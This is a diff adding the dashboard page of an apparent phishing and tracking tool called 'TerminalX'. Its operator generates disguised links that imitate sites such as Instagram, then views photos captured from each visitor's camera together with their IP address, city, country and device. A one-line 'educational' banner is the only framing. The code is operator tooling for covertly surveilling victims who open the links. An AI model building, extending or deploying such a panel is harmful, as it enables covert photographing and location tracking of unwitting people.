@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-auth-compat.js"></script>
+    <script src="config.js"></script>
+    <script>document.write(`<style>${COMMON_CSS}</style>`);</script>
+</head>
+<body>
+    <div class="app-header">
+        <div class="logo"><i class="ph-duotone ph-terminal-window"></i> TerminalX</div>
+        <button onclick="toggleMenu()" class="btn-icon"><i class="ph-bold ph-list"></i></button>
+    </div>
+    
+    <div class="warning-strip">
+        <i class="ph-fill ph-warning"></i> Educational / Security testing only.
+    </div>
+
+    <div class="scroll-area">
+        <div class="container">
+            <div class="card">
+                <div class="card-head">
+                    <span class="card-title">New Operation</span>
+                    <i class="ph-duotone ph-rocket" style="color:var(--primary); font-size:1.2rem;"></i>
+                </div>
+                <div class="input-box">
+                    <i class="ph-bold ph-link"></i>
+                    <input type="url" id="tUrl" placeholder="Target URL (e.g. instagram.com)">
+                </div>
+                <button onclick="create()" class="btn btn-primary">Generate Link <i class="ph-bold ph-arrow-right"></i></button>
+                <div id="res" style="display:none; margin-top:15px; background:#f0fdf4; border:1px dashed #22c55e; padding:15px; border-radius:12px;">
+                    <div style="font-size:0.8rem; color:#15803d; font-weight:700; margin-bottom:5px;">CAMPAIGN ACTIVE</div>
+                    <div id="lnk" style="font-family:monospace; color:#15803d; word-break:break-all; font-size:0.9rem;"></div>
+                </div>
+            </div>
+
+            <h3 style="margin: 20px 5px 15px 5px; font-size:1rem; color:var(--text-sub);">Active Operations</h3>
+            <div id="list"><div class="loader"></div></div>
+        </div>
+    </div>
+
+    <div id="menuOverlay" class="overlay" onclick="toggleMenu()"></div>
+    <div id="sidebar" class="sidebar">
+        <div class="menu-head">
+            <div class="logo" style="font-size:1.2rem;">Menu</div>
+            <button onclick="toggleMenu()" class="btn-icon"><i class="ph-bold ph-x"></i></button>
+        </div>
+        <a href="#" class="menu-item"><i class="ph-duotone ph-instagram-logo"></i> Instagram</a>
+        <div id="adminNav" style="display:none;">
+            <a href="admin.html" class="menu-item" style="color:var(--primary); background:#ede9fe;"><i class="ph-bold ph-shield-star"></i> Admin Panel</a>
+        </div>
+        <div style="flex:1"></div>
+        <a href="#" onclick="logout()" class="menu-item" style="color:var(--danger);"><i class="ph-bold ph-sign-out"></i> Logout</a>
+    </div>
+
+    <!-- Modals & Toasts UI -->
+    <div id="modal" class="modal-wrap">
+        <div class="modal-card">
+            <div id="m-wrap">
+                <h3 id="m-title" style="margin-bottom:10px;"></h3>
+                <p id="m-desc" style="color:var(--text-sub); font-size:0.9rem; margin-bottom:20px;"></p>
+                <div id="m-input-container" class="input-box" style="display:none;">
+                    <i class="ph-bold ph-pencil-simple"></i>
+                    <input type="text" id="m-input" placeholder="Enter value...">
+                </div>
+                <div class="m-btns">
+                    <button onclick="closeModal()" class="m-btn" style="background:var(--bg); color:var(--text);">Cancel</button>
+                    <button id="m-confirm" onclick="handleConfirm()" class="m-btn">Confirm</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="toast" class="toast"></div>
+
+<script>
+    firebase.initializeApp(firebaseConfig);
+
+    firebase.auth().onAuthStateChanged(user => {
+        if(!user) window.location.href = 'index.html';
+        else {
+            if(localStorage.getItem('isAdmin') === 'true') {
+                document.getElementById('adminNav').style.display = 'block';
+            }
+            load();
+            setInterval(load, 5000);
+        }
+    });
+
+    // Helper functions for UI
+    function toggleMenu() { document.getElementById('sidebar').classList.toggle('open'); document.getElementById('menuOverlay').style.display = document.getElementById('sidebar').classList.contains('open') ? 'block' : 'none'; }
+    function showToast(msg) { const t = document.getElementById('toast'); t.innerHTML = `<i class="ph-fill ph-check-circle"></i> ${msg}`; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 3000); }
+    let currentAction = null;
+    function openModal(type, title, desc, action) { document.getElementById('m-title').innerText = title; document.getElementById('m-desc').innerText = desc; document.getElementById('m-input-container').style.display = type==='input'?'block':'none'; currentAction = action; document.getElementById('modal').classList.add('active'); }
+    function closeModal() { document.getElementById('modal').classList.remove('active'); currentAction = null; }
+    function handleConfirm() { if(currentAction) currentAction(document.getElementById('m-input').value); closeModal(); }
+    function logout() { firebase.auth().signOut().then(()=>window.location.href='index.html'); }
+    function cpy(t) { navigator.clipboard.writeText(t).then(()=>showToast('Copied to Clipboard')); }
+
+    async function create() {
+        const u = document.getElementById('tUrl').value;
+        if(!u) return showToast('Enter valid URL');
+        const token = await getToken();
+        try {
+            const r = await fetch(`${API_BASE}/api/create_link`, {method:'POST', headers:{'Content-Type':'application/json', 'Authorization': `Bearer ${token}`}, body:JSON.stringify({url:u})});
+            const d = await r.json();
+            if(d.success) {
+                document.getElementById('res').style.display='block';
+                document.getElementById('lnk').innerText = API_BASE + '/v/' + d.sid;
+                document.getElementById('tUrl').value='';
+                showToast('Link Generated'); load();
+            }
+        } catch(e){}
+    }
+
+    async function load() {
+        const l = document.getElementById('list');
+        const token = await getToken();
+        try {
+            const r = await fetch(`${API_BASE}/api/get_links`, {headers:{'Authorization': `Bearer ${token}`}});
+            const d = await r.json();
+            l.innerHTML='';
+            const k = Object.keys(d).reverse();
+            if(k.length===0) { l.innerHTML='<div style="text-align:center; color:var(--text-sub); padding:20px;">No active links</div>'; return; }
+            
+            k.forEach(id => {
+                const i = d[id]; const m = i.meta || {}; const p = i.photos ||[];
+                let phH = '';
+                if(p.length) {
+                    phH = '<div class="gallery">';
+                    p.forEach((x, idx) => { phH += `<div class="img-box"><img src="data:image/jpeg;base64,${x}"><div class="img-overlay"><a href="data:image/jpeg;base64,${x}" download="${id}_${idx}.jpg"><i class="ph-bold ph-download-simple ovl-icon"></i></a><i onclick="delP('${id}','${idx}')" class="ph-bold ph-trash ovl-icon" style="color:#ef4444"></i></div></div>`; });
+                    phH += '</div>';
+                }
+                const locStr = m.city ? `${m.city}, ${m.country}` : (m.ip || 'Waiting...');
+                
+                l.innerHTML += `
+                <div class="link-card">
+                    <div class="link-top"><span class="badge">#${id}</span><span style="font-size:0.7rem; color:var(--text-sub);">${new Date(i.created*1000).toLocaleDateString()}</span></div>
+                    <span class="url-text">${API_BASE}/v/${id}</span>
+                    <div class="meta-row">
+                        <span class="meta-tag"><i class="ph-fill ph-map-pin"></i> ${locStr}</span>
+                        <span class="meta-tag"><i class="ph-fill ph-device-mobile"></i> ${m.device ? m.device.substring(0,12)+'..' : 'N/A'}</span>
+                    </div>
+                    ${phH}
+                    <div class="actions">
+                        <button onclick="cpy('${API_BASE}/v/${id}')" class="act-btn act-copy"><i class="ph-bold ph-copy"></i></button>
+                        <button onclick="del('${id}')" class="act-btn act-del"><i class="ph-bold ph-trash"></i></button>
+                    </div>
+                </div>`;
+            });
+        } catch(e){}
+    }
+
+    async function del(id) { openModal('confirm', 'Delete', 'Are you sure?', async()=>{ const token = await getToken(); await fetch(`${API_BASE}/api/delete_link/${id}`, {method:'POST', headers:{'Authorization': `Bearer ${token}`}}); showToast('Deleted'); load(); }); }
+    async function delP(id, idx) { openModal('confirm', 'Delete Photo', 'Delete this photo?', async()=>{ const token = await getToken(); await fetch(`${API_BASE}/api/delete_photo/${id}/${idx}`, {method:'POST', headers:{'Authorization': `Bearer ${token}`}}); showToast('Photo Deleted'); load(); }); }
+</script>
+</body>
+</html>
